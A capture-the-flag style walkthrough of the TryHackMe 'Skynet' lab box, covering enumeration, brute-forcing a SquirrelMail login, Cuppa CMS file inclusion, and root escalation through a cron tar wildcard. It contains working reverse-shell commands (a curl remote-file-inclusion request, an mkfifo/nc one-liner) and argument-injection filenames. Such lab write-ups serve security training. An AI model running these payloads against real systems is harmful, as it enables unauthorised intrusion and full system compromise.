---
title: 'Skynet - TryHackMe Walkthrough'
date: 2020-07-06 00:00:00
featured_image: '/images/posts/skynet-thm.png'
excerpt: A Vulnerable terminator themed Linux machine.
---
﻿![](/images/posts/skynet-thm.png)

### Goal
A Vulnerable terminator themed Linux machine.

### Reconnaissance
The page is having a Google Styled search, but nothing is returning. Other than that no much information available on the web page. So ran the nmap to find more information about the host.

      $ nmap -p- -A 10.10.166.117

    Host is up (0.20s latency).
    Not shown: 65529 closed ports
    PORT    STATE SERVICE     VERSION
    22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey:
    |   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
    |   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
    |_  256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)
    80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    |_http-title: Skynet
    110/tcp open  pop3        Dovecot pop3d
    |_pop3-capabilities: RESP-CODES UIDL SASL TOP PIPELINING AUTH-RESP-CODE CAPA
    139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
    143/tcp open  imap        Dovecot imapd
    |_imap-capabilities: SASL-IR ID IDLE Pre-login listed OK ENABLE LOGIN-REFERRALS capabilities have LITERAL+ post-login IMAP4rev1 more LOGINDISABLEDA0001
    445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
    Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel

        Host script results:
        |_clock-skew: mean: 1h39m57s, deviation: 2h53m12s, median: -3s
        |_nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
        | smb-os-discovery:
        |   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
        |   Computer name: skynet
        |   NetBIOS computer name: SKYNET\x00
        |   Domain name: \x00
        |   FQDN: skynet
        |_  System time: 2020-07-06T10:25:46-05:00
        | smb-security-mode:
        |   account_used: guest
        |   authentication_level: user
        |   challenge_response: supported
        |_  message_signing: disabled (dangerous, but default)
        | smb2-security-mode:
        |   2.02:
        |_    Message signing enabled but not required
        | smb2-time:
        |   date: 2020-07-06T15:25:46
        |_  start_date: N/A

**From the nmap results, the host is running:**  
OS: Linux - Ubuntu  
Port 22 for SSH is open  
one http service on 80 using Apache/2.4.18  
POP3 - on port 110 using Dovecot pop3d  
IMAP - on port 143 using Dovecot imapd  
Samba - on 139 with 3.X - 4.X (workgroup: WORKGROUP) and 445 with 4.3.11-Ubuntu (workgroup: WORKGROUP).  

### Enumerating the SMB
```bash
    $ nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.166.117
    Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-06 12:36 EDT
    Nmap scan report for 10.10.166.117
    Host is up (0.20s latency).

    PORT    STATE SERVICE
    445/tcp open  microsoft-ds

    Host script results:
    | smb-enum-shares:
    |   account_used: guest
    |   \\10.10.166.117\IPC$:
    |     Type: STYPE_IPC_HIDDEN
    |     Comment: IPC Service (skynet server (Samba, Ubuntu))
    |     Users: 1
    |     Max Users: <unlimited>
    |     Path: C:\tmp
    |     Anonymous access: READ/WRITE
    |     Current user access: READ/WRITE
    |   \\10.10.166.117\anonymous:
    |     Type: STYPE_DISKTREE
    |     Comment: Skynet Anonymous Share
    |     Users: 0
    |     Max Users: <unlimited>
    |     Path: C:\srv\samba
    |     Anonymous access: READ/WRITE
    |     Current user access: READ/WRITE
    |   \\10.10.166.117\milesdyson:
    |     Type: STYPE_DISKTREE
    |     Comment: Miles Dyson Personal Share
    |     Users: 0
    |     Max Users: <unlimited>
    |     Path: C:\home\milesdyson\share
    |     Anonymous access: <none>
    |     Current user access: <none>
    |   \\10.10.166.117\print$:
    |     Type: STYPE_DISKTREE
    |     Comment: Printer Drivers
    |     Users: 0
    |     Max Users: <unlimited>
    |     Path: C:\var\lib\samba\printers
    |     Anonymous access: <none>
    |_    Current user access: <none>
    |_smb-enum-users: ERROR: Script execution failed (use -d to debug)
```  

The nmap result above shows there is a anonymous login and a user account milesdyson.

`$ smbclient \\\\10.10.166.117\\anonymous -U anonymous`

Once logged in, there are two interesting files *attention.txt* and *logs/log1.txt* ; the former gives some information on password change and latter looks like passwords for some id. Save them.

### Finding the hidden services

Using `dirb` with a word list found below directories are available on the host

```bash
    $ dirb http://10.10.166.117 /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -i -w

    -----------------
    DIRB v2.22    
    By The Dark Raver
    -----------------

    START_TIME: Mon Jul  6 13:46:16 2020
    URL_BASE: http://10.10.166.117/
    WORDLIST_FILES: /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
    OPTION: Using Case-Insensitive Searches
    OPTION: Not Stopping on warning messages

    -----------------

    GENERATED WORDS: 81642                                                         

    ---- Scanning URL: http://10.10.166.117/ ----
    ==> DIRECTORY: http://10.10.166.117/admin/                                                        
    ==> DIRECTORY: http://10.10.166.117/css/                                                          
    ==> DIRECTORY: http://10.10.166.117/js/                                                           
    ==> DIRECTORY: http://10.10.166.117/config/                                                       
    ==> DIRECTORY: http://10.10.166.117/ai/                                                           
    ==> DIRECTORY: http://10.10.166.117/squirrelmail/  
```
There is a email service running under  `/squirrelmail/`, which is using squirrel mail.

### Cracking the Email Login
Using Burp, captured the POST request for email login and brute forced the password with the log1.txt as payload in sniper mode.
```
    POST /squirrelmail/src/redirect.php HTTP/1.1
    Host: 10.10.166.117
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Referer: http://10.10.166.117/squirrelmail/src/login.php
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 100
    DNT: 1
    Connection: close
    Cookie: SQMSESSID=73g8reflthofn3nsanktn7v7e0
    Upgrade-Insecure-Requests: 1

    login_username=milesdyson&secretkey=cyborg007haloterminator&js_autodetect_results=1&just_logged_in=1
```
- One password from the list worked for milesdyson and it is *cyborg007haloterminator*.
- There are three emails in his inbox and one has SMB password:  *)s{A&2Z=F^n_E.B`*.

### Gathering the information
- Log into the SMB using the credentials.
- Navigate to *notes/* and download all the files, but the *important.txt* has some useful information what Miles want to do:
```
    1. Add features to beta CMS /45kra24zxs28v3yd
    2. Work on T-800 Model 101 blueprints
    3. Spend more time with my wife
```
- This shows there is a another service that is running on the URI `/45kra24zxs28v3yd`.
- Run the dirb to get any valid URIs it has.

```bash
   $ dirb http://10.10.166.117/45kra24zxs28v3yd /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -i -w

    -----------------
    DIRB v2.22    
    By The Dark Raver
    -----------------

    START_TIME: Mon Jul  6 14:59:40 2020
    URL_BASE: http://10.10.166.117/45kra24zxs28v3yd/
    WORDLIST_FILES: /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
    OPTION: Using Case-Insensitive Searches
    OPTION: Not Stopping on warning messages

    -----------------

    GENERATED WORDS: 81642                                                         

    ---- Scanning URL: http://10.10.166.117/45kra24zxs28v3yd/ ----
    ==> DIRECTORY: http://10.10.166.117/45kra24zxs28v3yd/administrator/                               
    --> Testing: http://10.10.166.117/45kra24zxs28v3yd/smartphon
```
- The above output shows there is a administrator page and once you navigate it will show the *Cuppa CMS* login page.

### Exploiting the Web Application

- The Cuppa CMS has [vulnerability](https://www.exploit-db.com/exploits/25971), where we can inject the php code.
- Using this known vulnerability, frame the URL to access the user flag: `http://10.10.166.117/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../home/milesdyson/user.txt`
- But this will not work for root flag because of permissions.

### Getting a Reverse Shell

- Using the **Remote File Inclusion,** we can include the php remote shell code from [Pentest Monkey](http://pentestmonkey.net/tools/php-reverse-shell).
- Update the ip and port to our local, where we need to get the reverse shell.

```
    $ip = '10.2.18.4';  // CHANGE THIS
    $port = 4444;       // CHANGE THIS
```
- Open a simple http server from the location where the php reverse shell is, using `python3 -m http.server`, so the attacker will be able to download the file.
- Open a netcat on 4444 `nc -lnvp 4444`.
- From the terminal, send a request including Remote File Inclusion.
`curl http://10.10.166.117/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig\=http://10.2.18.4:8000/php-reverse-shell.php`
- This will open up the remote shell with the id `www-data` and capture the user flag at `/home/milesdyson/user.txt`.  

### Escalating the privileges

- By checking the crontab entries, there is one entry that is performing backup every minute and by root id.

```
*/1 *   * * *   root    /home/milesdyson/backups/backup.sh

$ cat /home/milesdyson/backups/backup.sh
  #!/bin/bash
  cd /var/www/html
  tar cf /home/milesdyson/backups/backup.tgz *
```

- We will be exploiting using the [Wildcard on Linux](https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/).
- Open another netcat session on the attacker machine with a different port, 4446 to get the reverse shell.
- Create a payload for reverse shell with destination:
```bash
    cd /var/www/html  
    echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.2.18.4 4446 >/tmp/f" > shell.sh  
    touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"  
    touch "/var/www/html/--checkpoint=1
```

- Once the scheduler runs, we will get a root shell.

```bash

    $ nc -lnvp 4446
    listening on [any] 4446 ...
    connect to [10.2.18.4] from (UNKNOWN) [10.10.166.117] 49360
    bash: cannot set terminal process group (4812): Inappropriate ioctl for device
    bash: no job control in this shell
    root@skynet:/var/www/html# cd /root
    cd /root
    root@skynet:~# ls -lrt
    ls -lrt
    total 4
    -rw-r--r-- 1 root root 33 Sep 17  2019 root.txt
    root@skynet:~# cat root.txt
    cat root.txt
    3f0372db2--------7179a282cd6a949
```
